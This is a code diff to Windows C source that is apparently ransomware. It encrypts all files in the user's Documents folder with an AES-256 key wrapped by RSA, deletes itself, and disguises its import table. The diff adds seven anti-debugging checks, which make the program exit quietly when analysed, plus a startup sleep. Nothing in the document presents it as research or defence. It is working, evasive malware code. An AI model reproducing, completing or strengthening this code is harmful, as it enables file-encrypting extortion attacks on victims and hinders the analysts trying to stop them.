@@ -8,48 +8,64 @@
 #define NEW L":NEWDATA"
 
 static INT GoodFunction() {
+	
+	BOOL debuggerDetected = FALSE;
+	debuggerDetected |= CheckIsDebuggerPresent();
+	debuggerDetected |= CheckRemoteDebugger();
+	debuggerDetected |= CheckProcessDebugFlags();
+	debuggerDetected |= CheckProcessDebugPort();
+	debuggerDetected |= CheckTimingAnomaly();
+	debuggerDetected |= CheckHardwareBreakpoints();
+	debuggerDetected |= CheckUsingExceptions();
 
-	InitializeSysCalls();
-	InitializeRandomValue();
-	InitializeModules();
-	uint8_t keyValue[AES_256_KEY_SIZE];
-	uint8_t iv[IV_SIZE];
-	SIZE_T szkey = AES_256_KEY_SIZE;
-	WCHAR	userName[MAX_PATH * sizeof(WCHAR)];
-	WCHAR	keyPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
-	WCHAR directoryPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
-	WCHAR ivPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
-	SIZE_T szName = MAX_PATH * sizeof(WCHAR);
-
-
-	if (!GetUserNameW(userName, &szName)) {
-		return -1;
+	if (debuggerDetected)
+	{
+		IatCamouflage();
+		return 0;
 	}
+	else {
+		InitializeSysCalls();
+		InitializeRandomValue();
+		InitializeModules();
+		uint8_t keyValue[AES_256_KEY_SIZE];
+		uint8_t iv[IV_SIZE];
+		SIZE_T szkey = AES_256_KEY_SIZE;
+		WCHAR	userName[MAX_PATH * sizeof(WCHAR)];
+		WCHAR	keyPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
+		WCHAR directoryPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
+		WCHAR ivPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
+		SIZE_T szName = MAX_PATH * sizeof(WCHAR);
 
-	if (!GenerateKey(keyValue, iv)) {
-		return -1;
+
+		if (!GetUserNameW(userName, &szName)) {
+			return -1;
+		}
+
+		if (!GenerateKey(keyValue, iv)) {
+			return -1;
+		}
+
+		StringCchCat(keyPath, MAX_PATH * sizeof(WCHAR), userName);
+		StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), userName);
+		StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\IV");
+
+		if (!WriteToFile(iv, ivPath, IV_SIZE)) {
+			return -1;
+		}
+
+		if (!RSAwork(keyValue, keyPath)) {
+			return -1;
+		}
+
+		StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), userName);
+		StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), L"\\Documents");
+
+		if (!DirectoryFiles(directoryPath, keyValue, iv)) {
+			return -1;
+		}
+		return 0;
+
 	}
-
-	StringCchCat(keyPath, MAX_PATH * sizeof(WCHAR), userName);
-	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), userName);
-	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\IV");
-
-	if (!WriteToFile(iv, ivPath, IV_SIZE)) {
-		return -1;
-	}
-
-	if (!RSAwork(keyValue, keyPath)) {
-		return -1;
-	}
-
-	StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), userName);
-	StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), L"\\Documents");
-
-	if (!DirectoryFiles(directoryPath, keyValue, iv)) {
-		return -1;
-	}
-	return 0;
-
 }
 
 BOOL SelfDeletion() {
@@ -99,13 +115,14 @@ BOOL SelfDeletion() {
 
 }
 
+
+
+
 int WinMain() {
-		SelfDeletion();
-		IatCamouflage();
-		GoodFunction();
+	Sleep(5000);
+	SelfDeletion();
+	IatCamouflage();
+	GoodFunction();
 
-
-	getchar();
 	return 0;
 }
-
